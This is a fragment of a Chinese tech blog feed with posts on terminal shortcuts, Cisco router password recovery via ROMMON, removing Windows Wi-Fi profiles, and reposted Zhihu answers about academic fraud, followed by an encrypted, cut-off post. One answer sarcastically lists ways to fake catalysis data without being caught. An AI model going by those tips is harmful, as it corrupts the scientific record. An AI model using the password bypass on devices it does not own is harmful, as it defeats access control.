      <link href="/2022/02/03/terminal-chang-yong-kuai-jie-jian/"/>
      <url>/2022/02/03/terminal-chang-yong-kuai-jie-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="终端操作">终端操作</h3><pre class="line-numbers language-none"><code class="language-none">Ctrl+D/Exit 退出当前Termina1Ctrl+L/clear 清除屏幕Ctrl+Alt+T/Ctrl+Shift+N 打开新终端窗口Ctrl+Shift+T 打开新终端标签页Ctrl+Shift+C 复制Ctrl+Shift+V 黏贴Ctrl+PageuShiftPagedown 左右切换标签页Ctrl+S 暂停屏幕输出Ctrl+Q 继续屏幕输出Ctrl+K 删除当前光标位置至末尾的所有内容Ctrl+U 删除当前光标位置至开头的所有内容Shift+Pageup/Pagedown 上下滚动屏幕F11 全屏切换Ctrl+Win+上下键 切换console控制台的最大化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="光标移动">光标移动</h3><pre class="line-numbers language-none"><code class="language-none">Ctrl + A 移动到本行开头Ctrl + E 移动到本行结尾Ctrl + P 上一个命令(或者方向键的上箭头)Ctrl + N 下一个命令(或者方向键的下箭头)Alt + B 往回移动一个word(或者Option+Right-Arrow)Alt + F 往前移动一个word(或者Option+Left-Arrow)Ctrl + F 往前移动光标Ctrl + B 往回移动光标Ctrl + xx 选中当前光标字符与本行首字符之间的所有内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分页显示">分页显示</h3><p>h键或?键 简要显示键盘命令的作用。</p><p>空格键显示k行（可以在部分命令键前先按数字键，将数值传递给命令，此数值就称为k）。默认值为屏幕行数。</p><p>z键显示k行。默认值为屏幕行数。如果定义了新的k值，k值将成为新的默认值。</p><p>回车键显示k行。默认值为1。如果定义了新的k值，k值将成为新的默认值。</p><p>d键或Ctrl+D键滚动k行。默认值为当前滚动的行数。如果定义了新的k值，k值将成为新的默认值。</p><p>q键 退出</p><p>s键 向下跳过k个逻辑行。默认值为1。</p><p>f键 向下跳过k屏。默认值为1。</p><p>b键或Ctrl+B键 往回k屏幕。默认值为1。仅对文件有效，对管道无效。</p><p>=键 显示当前行号。</p><p>/键+正则表达式 搜索第k次出现的正则表达式。默认值为1。</p><p>n键 搜索第k次出现的最后用过的正则表达式。默认值为1。</p><p>!键+命令或:键+!键+命令 在一个子shell中启动指定命令。</p><p>v键在当前行启动编辑器。编辑器由环境变量决定，优先权为VISUAL&gt;EDITOR，如果VISUAL和EDITOR均未定义，则启动vi。</p><p>Ctrl+L键 重新绘制屏幕。</p><p>:键+n键 跳到第k个文件。默认值为1。</p><p>:键+p键 跳到第k个之前的文件。默认值为1。</p><p>:键+f键 显示当前的文件名及行号。</p><p>.键 重复前一个命令。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco思科企业路由器密码重置</title>
      <link href="/2022/01/29/cisco-si-ke-qi-ye-lu-you-qi-mi-ma-chong-zhi/"/>
      <url>/2022/01/29/cisco-si-ke-qi-ye-lu-you-qi-mi-ma-chong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="cisco思科企业路由器密码重置">Cisco思科企业路由器密码重置</h1><span id="more"></span><ol type="1"><li><p>此时如果可以通过调试线访问路由器的话，检查是否有<code>show version</code>命令权限。输出的最后一行提示了设置文件寄存器的地址。如果没有种种原因，无法访问路由器，那么此时设置文件寄存器的地址应为<code>0x2102</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token operator">&gt;</span>show version<span class="token operator">&lt;</span>output omitted<span class="token operator">&gt;</span>Configuration register is 0x2102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p></p></li><li><p>重启路由器（<code>reload</code>），并在启动后的60s内中断启动，以进入<strong>ROMMON</strong>模式。中断方式见附录。</p></li><li><p>在<code>rommon 1&gt;</code>后输入<code>confreg 0x2142</code>以从闪存启动。此条命令会使路由器在下次重置时跳过启动设置步骤。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rommon <span class="token number">1</span> <span class="token operator">&gt;</span> confreg 0x2142You must reset or power cycle <span class="token keyword">for</span> new config to take effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p></p></li><li><p>在<code>rommon 2&gt;</code>后输入<code>reset</code>以重启路由器。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rommon <span class="token number">2</span> <span class="token operator">&gt;</span> resetSystem Bootstrap, Version <span class="token number">11.3</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>XA4, RELEASE SOFTWARE <span class="token punctuation">(</span>fc1<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1999</span> by cisco Systems, Inc.TAC:Home:SW:IOS:Specials <span class="token keyword">for</span> infoC2600 platform with <span class="token number">32768</span> Kbytes of main memory<span class="token operator">&lt;</span>output Omitted<span class="token operator">&gt;</span>router<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p></li><li><p>在设置向导质询中回答<code>no</code>或者按<code>Ctrl-C</code>以跳过初始化设置向导。</p><pre class="line-numbers language-none"><code class="language-none">Would you like to enter the initial configuration dialog? [yes/no]: n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p></li><li><p>输入<code>enable</code>进入<strong>Enable</strong>模式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token operator">&gt;</span>enableRouter<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p></p></li><li><p>如果要恢复密码，输入<code>configure memory</code>或<code>copy startup-config running-config</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment">#copy startup-config running-config</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p></li><li><p>输入<code>show running-config</code>以确定活动设置文件已被更改。</p></li><li><p>输入<code>configure terminal</code>。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment">#configure termial</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p></li><li><p>如要更改密码，输入<code>enable secret &lt;password&gt;</code>，使用<code>hostname(config)#</code>提示符。此时，可以重置路由器的其他密码。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment"># conf t</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#enable secret &lt;new_secret_password&gt;</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#enable password &lt;new_enable_password&gt;</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#line vty 0 15</span>Router<span class="token punctuation">(</span>config-line<span class="token punctuation">)</span><span class="token comment">#password &lt;new_vty_password&gt;</span>Router<span class="token punctuation">(</span>config-line<span class="token punctuation">)</span><span class="token comment">#login</span>Router<span class="token punctuation">(</span>config-line<span class="token punctuation">)</span><span class="token comment">#line con 0</span>Router<span class="token punctuation">(</span>config-line<span class="token punctuation">)</span><span class="token comment">#password &lt;new_console_password&gt;</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#^z</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p></li><li><p>在计划使用的各个<strong>Interface</strong>中执行<code>no shutdown</code>命令。</p></li><li><p>执行<code>write memory</code>或<code>copy running-config startup-config</code>来将配置文件写入启动过程。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment">#copy running-config startup-config</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p></li><li><p>输入<code>configure termial</code>，返回到全局配置模式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment">#configure terminal</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p></li><li><p>输入<code>config-register 0x2102</code>并按<code>Ctrl-z</code>以保存更改并退出<code>privilege EXEC</code>模式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#config-register 0x2102</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#^Z</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p></p></li><li><p>输入<code>reload</code>重启路由器，此时路由器使用<code>0x2102</code>配置寄存器启动。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Router<span class="token comment">#reload</span>Your passwords have now been reset.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p></p></li></ol><h1 id="附录">附录</h1><h2 id="hyperterminal">Hyperterminal</h2><pre class="line-numbers language-none"><code class="language-none">IBM Compatible Windows XP Ctrl-BreakIBM Compatible Windows 2000 Ctrl-Break IBM Compatible Windows 98 Ctrl-Break (version 595160)IBM Compatible Windows 95 Ctrl-F6-Break <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="kermit">Kermit</h2><pre class="line-numbers language-none"><code class="language-none">Sun WorkstationUNIX Ctrl-\l Ctrl-\b <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="microphone-pro">MicroPhone Pro</h2><pre class="line-numbers language-none"><code class="language-none">IBM Compatible Windows Ctrl-Break <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="minicom">Minicom</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleLinux Ctrl-a f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="procomm-plus">ProComm Plus</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleDOS or Windows Alt-b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="securecrt">SecureCRT</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleWindowsCtrl-Break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="telix">Telix</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleDOSCtrl-End <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="telnet">Telnet</h2><pre class="line-numbers language-none"><code class="language-none">N/AN/ACtrl-], then type send brk <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="telnet-to-cisco">Telnet to Cisco</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleN/ACtrl-] <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="teraterm">Teraterm</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleWindows Alt-b <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="terminal">Terminal</h2><pre class="line-numbers language-none"><code class="language-none">IBM CompatibleWindows Break Ctrl-Break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="tip">Tip</h2><pre class="line-numbers language-none"><code class="language-none">Sun WorkstationUNIX Ctrl-], then Break or Ctrl-c ~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="vt-100-emulation">VT 100 Emulation</h2><pre class="line-numbers language-none"><code class="language-none">Data General N/AF16 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="windows-nt">Windows NT</h2><pre class="line-numbers language-none"><code class="language-none">IBM Compatible Windows Break-F5Shift-F5 Shift-6 Shift-4 Shift-b (^$B)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="z-terminal">Z-TERMINAL</h2><pre class="line-numbers language-none"><code class="language-none">Mac Apple Command-b <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="na">N/A</h2><pre class="line-numbers language-none"><code class="language-none">Break-Out Box N/AConnect pin 2 (X-mit) to +V for half a second Cisco to aux portN/AControl-Shft-6, then b IBM Compatible N/ACtrl-Break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
            <tag> 网络 </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除 Win10 中不再使用的或重复的网络</title>
      <link href="/2022/01/25/shan-chu-win10-zhong-bu-zai-shi-yong-de-huo-chong-fu-de-wang-luo/"/>
      <url>/2022/01/25/shan-chu-win10-zhong-bu-zai-shi-yong-de-huo-chong-fu-de-wang-luo/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>Win 8 及 Win 10 重置路由器（或更换）后，再次连接路由器（还是原 SSID的情况下）鼠标悬停右下角网络图标，显示的网络名称后边会跟一个数字，比如<code>SSID 2</code> 或 <code>网络 2</code>，那么如何删除这个数字呢？</p><p>这个问题有多种方法可以解决</p><blockquote><p>删除配置后，如果再次连接需要输入密码</p></blockquote><blockquote><p>如果你曾经连接过很多网络，可能会有很多数据，一定要看清楚再删除！在操作过程中可能需要<code>Administrator</code>权限</p></blockquote><h2 id="使用设置应用">使用「设置」应用</h2><p>在开始菜单中打开设置，进入<code>网络和Internet</code>，选择<code>Wi-Fi</code></p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Misaka13514/asset@main/blog/_posts/win-ssid-number/Settings-Network.png" alt="Wi-Fi"><figcaption aria-hidden="true">Wi-Fi</figcaption></figure><p>点击管理已保存的网络，找到需要删除的网络配置删除即可</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Misaka13514/asset@main/blog/_posts/win-ssid-number/Settings-Network-Forget.png" alt="管理已保存的网络"><figcaption aria-hidden="true">管理已保存的网络</figcaption></figure><h2 id="使用命令行">使用命令行</h2><p>如果你正在远程操作一台服务器或是习惯命令行的操作方式，这种方法会更快捷。</p><p>右键<code>Windows徽标</code>（快捷键：<code>Win</code>+<code>X</code>），选择<code>命令提示符（管理员）</code>或<code>Powershell（管理员）</code></p><p>输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh wlan show profiles <span class="token comment">#显示网络配置</span>netsh wlan show all      <span class="token comment">#我 全 都 要</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><figure><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Misaka13514/asset@main/blog/_posts/win-ssid-number/netsh-show.png" alt="显示网络配置"><figcaption aria-hidden="true">显示网络配置</figcaption></figure><blockquote><p><code>Profiles on interface *Wi-Fi*</code>其中的<code>*Wi-Fi*</code>是网络接口名称，不同设备可能显示结果不同</p></blockquote><p>找到要删除的配置名称<code>*Network*</code></p><p>使用以下命令删除</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh wlan delete profile <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"*Network*"</span> <span class="token assign-left variable">interface</span><span class="token operator">=</span><span class="token string">"*Wi-Fi*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><figure><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Misaka13514/asset@main/blog/_posts/win-ssid-number/netsh-delete.png" alt="删除网络配置"><figcaption aria-hidden="true">删除网络配置</figcaption></figure><p>显示已删除，再次查看网络配置，发现删除成功</p><h2 id="使用注册表编辑器">使用「注册表编辑器」</h2><p>以上方法可能并不能成功找到所有的配置，而使用「注册表编辑器」是一个彻底的方法。</p><p>右键<code>Windows徽标</code>（快捷键：<code>Win</code>+<code>X</code>），选择<code>运行</code></p><p>（快捷键：<code>Win</code>+<code>R</code>）</p><p>输入<code>regedit</code>打开注册表编辑器，找到如下路径:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除掉相关的注册子键，如图所示:</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Misaka13514/asset@main/blog/_posts/win-ssid-number/regedit.png" alt="注册子键"><figcaption aria-hidden="true">注册子键</figcaption></figure><p>然后在控制面板（<code>Win</code>+<code>R</code>,control）中禁用再启用网卡即可。</p><h2 id="参考资料">参考资料</h2><ul><li><a href="https://superuser.com/questions/850438/remove-the-2-after-the-ssid-on-windows-8-0">Removethe “2” after the SSID on Windows 8.0</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么有的科研人员要搞学术造假？</title>
      <link href="/2022/01/24/wei-shi-me-you-de-ke-yan-ren-yuan-yao-gao-xue-zhu-zao-jia/"/>
      <url>/2022/01/24/wei-shi-me-you-de-ke-yan-ren-yuan-yao-gao-xue-zhu-zao-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="科学技术快速发展但是也出现了很多学术造假的人为什么呢">科学技术快速发展，但是也出现了很多学术造假的人，为什么呢？</h1><span id="more"></span><p><strong>作者：知乎用户<br>https://www.zhihu.com/question/300070408/answer/2025987446</strong></p><p>实验室A造假结果a，没被发现，发了一篇水刊。</p><p>实验室B看了文章，八年老博士没重复出来，着急毕业一拍脑袋把假结果a填进去，符合预期，发了一篇水刊，顺利毕业。</p><p>大牛实验室C的老板看了两篇文章，产生一个很好的想法，让新来的博士后做实验，结果博士后第一步都重复不出来。C老板大骂博士后是水货，别人都能做出来你为什么做不出来？再不出结果就滚蛋！于是博士后造假，填上结果a，顺利进行计划。</p><p>大牛C老板基于假结果a，做出重大革新性发现，发表一篇nature，被无数人奉为圭臬。实验室D、E、F……的老板都表示，实验重复不出来一定是我们的技术问题，而不是权威大佬造假。</p><p>众多老板逼迫学生、博士后、技术员必须出结果，不出结果就是笨蛋，敢于质疑的都滚蛋。于是所有人一起造假。</p><p>偶尔有某个不信权威的老板Z提出质疑，被大牛C狠狠批驳，被圈子孤立，申请不到经费，从此退出科研圈。</p><p>最后假结果a横行数十年，没人发现。</p><p>当然了，偶尔也有被发现的。</p><p>问题的根源是全世界科研圈都是家长制度和门阀制度，大老板对小老板，小老板对学生和员工，有绝对的权力。</p><p>绝对的权力滋生绝对的腐败。</p><hr><p><strong>作者：随机人生<br>https://www.zhihu.com/question/300070408/answer/2190000533</strong></p><p>以催化剂研发为例，这个是最典型的天坑专业人力密集型研发。正常情况下，假设所有人不造假，所做的工作主要是排列组合加各种测试，测到性能好而且别人没发过的东西，那恭喜你，一篇sci有了。</p><p>然而只要有5%的人开始动了造假的心思，那么剩下95%的人如果不造假，就没饭吃了。道理很简单，一个课题出现几篇文章之后，大概什么性能会发在什么文章上面，后面的人心里就有数了。正常情况下随时间标准肯定也是逐渐变高的，比如tof30能发在jacs上，过两年可能这个要求就是40了，这属于正常科研进步。</p><p>这时候造假小子来了，他靠造假做出来个数据，本来这个性能比如说能发个jacs吧，但他是造假的，道理解释不太清，原位表征也没法做，就发个水平次一点的jmca。但这样一来，发文章的要求就被加速了，没造假的的成果，本来能发子刊的，现在jacs也发不了了。逐渐的，人们就会发现靠老老实实测出来的成果越来越做不过随便画柱状图，瞎编数据的了。</p><p>你的导师给了你一个课题，让你去做，然后你开始排列组合，试了几年没试出来一个能发文章的结果，眼看就要延期了，这时你发现一个自己明明试过没有性能的催化剂，被人拿来发了一篇文章，这时导师也来兴师问罪：怎么别人就有性能你就没有？这种事情出现一两次，正常人心态就崩了，算逑，老子也造假也瞎编。</p><p>然后这类型的造假难度有多高呢，答案是基本为0，能被抓到的都是太蠢的。比如国际大佬崔毅同志有一篇电催化二氧化碳还原的，发得焦耳还是自然催化来着记不清了，被发现稳定性的图有造假嫌疑，怎么回事呢？是有一段数据重复了三次。可能是材料不够稳定，把一段时间复制粘贴了三遍，这就很蠢了，换聪明点的去造假直接横坐标的数值乘个三不就完事了。</p><p>催化剂的材料表征部分，你不需要造假，该怎么做怎么做。但催化性能上面，你就随便瞎编，产量效率误差棒想怎么画怎么画，你可以提前准备好产物加到你的底物里面去，测出来就说是你催化剂催化的，别人怎么抓？解释原理也简单，电子态密度、氧空位、协同效应什么的总有能用上的话术，二区以下的文章连解释都不用解释，爷就测出来这个结果了你说怎么地吧。</p><p>而且期刊方真的有打假的动力吗？这个我是怀疑的，很多时候期刊也是希望息事宁人的，蚌埠住了再严肃处理。最好没人捅破窗户纸，大家一起看着影响因子一路坐火箭。</p><p>那么目前催化材料的造假程度，劣币驱逐的进程怎么样了呢？我只能说是触目惊心。比如电催化氮还原，这个领域几百篇文章能重复的估计就个位数，最近流行的甲烷制甲醇也没几个能重复的，人有多大胆就有多高产。当然胆子过于大扯着蛋的也有，比如自然催化上有个用铋纳米颗粒做氮还原的，性能已经编得突破天际了，直接高了其他人一个数量级，材料合成还很好重复，别人一试就发现你小子有问题，成了众矢之的。（所以催化的文章造假也可以考虑搞点极难合成的材料，别人想重复都懒得去做。）</p><p>还有那个什么电催化硝酸还原到氨的，这个课题一被发明出来出来我就笑了，造假都卷不过来开辟新战场了属于是。</p><p>很多材料类型的科研本来就应该是市场和企业主导的，本来就是应用导向的课题，让期刊和高校主导就是不可能不出问题的。任何缺乏监管又有利可图的行业，劣币驱逐良币就是必然的。</p><hr><p><strong>作者：tom zhang<br>https://www.zhihu.com/question/300070408/answer/579696096</strong></p><p>本科时候有个老师(教授)在上课的时候说，用的去年的ppt,我也不想这么干，也想把去年做的新项目，国际上的新进展好好总结下给大家讲讲。可是学校文章项目要求，实在是没挤出时间来重做PPT，对不住大家了。然后低声说了一句，现在大学啊，没有科研没有论文，立不起来啊。</p><p>现在自己在科研行业有了几年经历，发现，没有文章真的立不起来。学术做的好的，平台不错的，有货的还好，可是毕竟不是所有人都能做到，同时，现在的科研氛围就是这么功利，你能想着蚍蜉撼树螳臂当车去改变体制吗，而且话说回来，现在这个阶段，又有什么是更好的体制？谁能给出个完美的方子。</p><p>因此在评比机制的威逼下，在支撑帽子的利诱下，有部分人就搞起了学术造假。</p><hr><p><strong>作者：鸭鸭2019<br>https://www.zhihu.com/question/300070408/answer/593558280</strong></p><p>这玩意是连锁的。尤其是实验科学。</p><p>A做某个东西，实际做到30，吹吹小牛，做到了35吧，也算合理范围，说不定哪天地球太阳木星引力影响，这东西就真能做到35呢。这似乎也算不上造假。</p><p>B做同样的实验，结果是35，可A已经达到了35，那怎么办，吹吹牛，45吧。</p><p>C做到了40，吹牛50</p><p>D做到了50，吹80</p><p>劣币驱逐良币，很多人造假也是被逼的，往往一造假，就是一个领域造假。</p><p>说实在的，个别研究大方向就有问题，典型的就是哈佛的那次连环造假。但“反dong学术权威”说有，你咋做不出来，你做不出来是不是你脑子笨人懒？如果这个领域真的被证明是毫无意义的，这么多人还要毕业，还指望的funding怎么办？从上到下，一旦走错方向，造假都算是小事情。</p><p><strong>更多的是介于假和真之间,我想用美颜相机形容再合适不过。</strong></p><p>做过科研的都知道，文章里的数据都是千挑万选，反复加工，找最好的。真正的原始数据绝大部分都跟shit一样。</p><p>实验科学里这几乎是100%的，但即使是理论计算科学，和别人聊起，也严重存在这样的现象。拟合结果好放上去，差的视而不见。</p><p>还有的，就是你想要什么数据，我拼命给你做出你想要的数据。</p><p>或者我做出个东西，效果很好，然而在一些解释性的实验，数据上，却总有严重瑕疵或者不符合理论，不符合大牛们的模型，不符合预期结果，不符合其他文献报道，不能把研究热点生拉硬拽进来扯一番。可大自然不就是这么不完美的吗？那怎么办？只有想办法让数据合理咯。</p><p>东西是真的，但有数据是假的，只是为了让文章发出来，为了毕业，教职，职称，经费……</p><p>这不算假，但恐怕也不算真。你说这样做不对吗？不凑足数据，就有可能埋没了一个非常fancy非常好的发现发明。凑足绝对真是的数据，又发不了好的文章。</p><p>就好像一个大美女，偏偏脸上一块疤，怎么办？化妆整容美颜相机。能说拍出的照片人是假的吗？不能，敢不开滤镜吗？不敢。</p><p>半真半假，才是常态。科研工作者，不少人也是艺术工作者，写文章和艺术创作，和开了美颜相机磨皮磨皮再磨皮，差不多。</p><p>还是我提到的，真实的原始数据，大部分都和shit一样。如果哪天能允许用一大堆shit发文章，大家一起分析分析找找原因，我相信人类科研水平一定会上8个台阶。很多真正有价值的发现恰恰是一大堆Shit一样的原始数据里发现的。</p><p>再说后果，韩春雨小保方晴子哈佛那是枪打出头鸟，一般情况下，不开磨皮开美颜相机编辑直接拒了，<strong>只有前果，木有后果</strong>。就算真错了，意大利科学家连超光速都能研究出来，不是说电线接的有问题马?错就错了呗，好多人又可以依靠新结论水文章了，科学嘛，不就是反复推翻前人结论的过程嘛。窝佬这一块的10年初一个大牛搞了个研究热点不知道喷了有多少篇文章，去年另一大牛非常有礼貌地说这样做是有问题滴，应该这样婶儿婶儿，你看，又多了n篇文章……</p><p>作为一个在工业界干过一点活的人，这个回答下有个答主说得很好。</p><p>学术界一百个结果里有一个好的，就可以发论文</p><p>工业界里一百个样品里有一个坏的，产品就不能上马。</p><p>市场或者Money，比影响因子考验真金白银准确的多。</p><hr><p><strong>作者：雨落<br>https://www.zhihu.com/question/300070408/answer/2190243766</strong></p><p>之前有篇文章，一个数值测出来200多（越大越好），但是用它的参数，我拿FDTD算出来只有100多。</p><p>这篇文章发在高IF的期刊上了。</p><p>之后做类似的东西，无论我怎么优化，最多只有200。（别的1区论文测量值大约100多一点）</p><p>我不作假，我也没办法去怼别人。但是就这一篇论文，搞得我后续怎么发文章？</p><p>如果审稿人或者编辑问我，你怎么做的值没之前别人做的高呀？我要怎么回答他来突出我的novelty和impact？</p><p>说之前那个人把误差也算进去了，测了个很大的值，也不放软件计算的理想结果的对比？反正实验性学科。</p><p>所以科研这种东西，有人有意无意的搞一个特别亮眼的值出来，然后发表了。后续的人有时候就很难继续做。因为有些不是你一直研究就有突破的，很多数值已经很接近极限了，除了有些新的理论之类的出来。</p>]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>本科生学术灌水指南</title>
      <link href="/2022/01/24/ben-ke-sheng-xue-zhu-guan-shui/"/>
      <url>/2022/01/24/ben-ke-sheng-xue-zhu-guan-shui/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="76c5bd559a1c5587aede7f244cdf54b1e4ae4fa4373a9d79837eac2b7b7e457a">6631c9ec8021af02f8bc705399f9ef123be68fdd0d23b4cdfbb20efa1069661e5c9037b8a8d0748c7a86b894782e5b1b4aeb493ad333495975c8f312bd8387441fe78a356b7d8ef58b9035fa1f0ed9187fdd4c7dff31bc7ad7f20edbdc5bf6a18652005afdab221a0d94b96757c9e3f633085f6ddafbba135ae18d5d4973a6bcc894e16570e3d41e297230eb2b1d2a186509032b46708cae12d10f3f3513ba3c6d3fb0ec39a3aa57bc2e21783332aca5f59f7238e517c07242f3379257976a504c1c5679ff58dac993585079d06df72617ec5f172e60a3a937f972c01041343c97d786a7c3fbe8e95586cc75c4c30dacb7b3cc2872f4f14d2ef8c4dbb83b23eca96c317b9c33593b68ff1eb7e554a418c235b3a6515f840593c705a8c6667273e44a7179b952142329815a475533a4069481607fae76c6c5b7d9ba571770c7f892d659dc1cb846094b16aa56bcba24b0d95b0cd406fca0dec17b780c6ac1d0508459d9885eca07514156ec03377b12285517a3e538227644fdf8a0de527f3c13b3fd369bfa3779e6586d50586ce4e78d51085b063d6dfa1bdd6ec3de1d82f03f9b74e47e28443e8d40b158cc4becb30f5a6b3c27d371eff291bc2063b4b423b0f2755fd678c1c8c82720a8bed252897b0d221edfc92653b1fe9a9b3f6908cbeb61d2b40505469856a3c52ca61eb518cb3cc0efceee338bf1d85c0980ec03c975a88affb94b480b8fdc93a439c97679b97c0b90729c1923fbf438d9cbff9644231868679bf142f535d2c203b48099dbb132e80474329506cd0b17a2ea25a6bf276c482229357a7fc44ec09a1faadb36c342d20643716fdf2123627bdb46d3c1e5b05f82f234b35663ac00c310e25f0d55a03039fdce9313a8bb2199da31039d9498bcf206420b77f66d1ce7b497592d09a5e008ebbcef2efd184e0695ea6831bd156c8bebdd24fe037d3a5e8da8d3a3cc92d21d7728ae5fc32aff4a8840478c0d2245a5ec5fbe8543954d1d43df60cd9f692c3d7bcc054e92e1d88a3eb2b666be0097542f0ddb760bd6eeba9f223bda752ea37aad51fa90f858d181d89d2a3a939c4249b425125ae8b8f0fc18b4cf5a2c074c37cb796ad3d573f6e6cc1882ec13036b63e2e659cbf61aa3db1e9cfcad49bb5f37974d70599a163519b37ff73adc038cfcc083ae1bf3acf3b16355f1f6651f46e40b562c8ffc55c23b6f31c928d66e61cdd2aa69a04b980c6768f1da219f1197d731ffdb85dbb0e1889d3c50fd67977519e8e0f6f90fe0478870e2b02e27ff915c9a91b651236526c30d57e01c08a231bd6d412734a013a7325f15298441d4987d92f0843668a6e9a55de200e401e33328a1009e4ca427b